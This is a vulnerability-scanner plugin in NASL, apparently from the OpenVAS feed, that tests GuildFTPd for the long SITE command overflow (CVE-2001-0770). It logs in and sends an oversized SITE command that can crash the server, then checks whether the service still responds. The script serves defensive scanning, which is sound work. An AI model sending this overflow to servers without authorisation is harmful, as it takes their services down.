if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15851" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 2782 );
	script_cve_id( "CVE-2001-0770" );
	script_xref( name: "OSVDB", value: "5540" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "GuildFTPd Long SITE Command Overflow" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2004 David Maciejak" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_keys( "ftp/login" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/guildftpd/detected" );
	script_tag( name: "solution", value: "Upgrade or install another ftp server." );
	script_tag( name: "summary", value: "The remote FTP server seems to be vulnerable to denial service attack through
  the SITE command when handling specially long request." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || !ContainsString( banner, "GuildFTP" )){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
password = kb_creds["pass"];
if(login){
	soc = open_sock_tcp( port );
	if(!soc){
		exit( 0 );
	}
	if(ftp_authenticate( socket: soc, user: login, pass: password )){
		data = NASLString( "SITE ", crap( 262 ), "\\r\\n" );
		send( socket: soc, data: data );
		reply = ftp_recv_line( socket: soc );
		sleep( 1 );
		soc2 = open_sock_tcp( port );
		if(!soc2){
			security_message( port );
		}
		close( soc2 );
		data = NASLString( "QUIT\\n" );
		send( socket: soc, data: data );
	}
	close( soc );
}

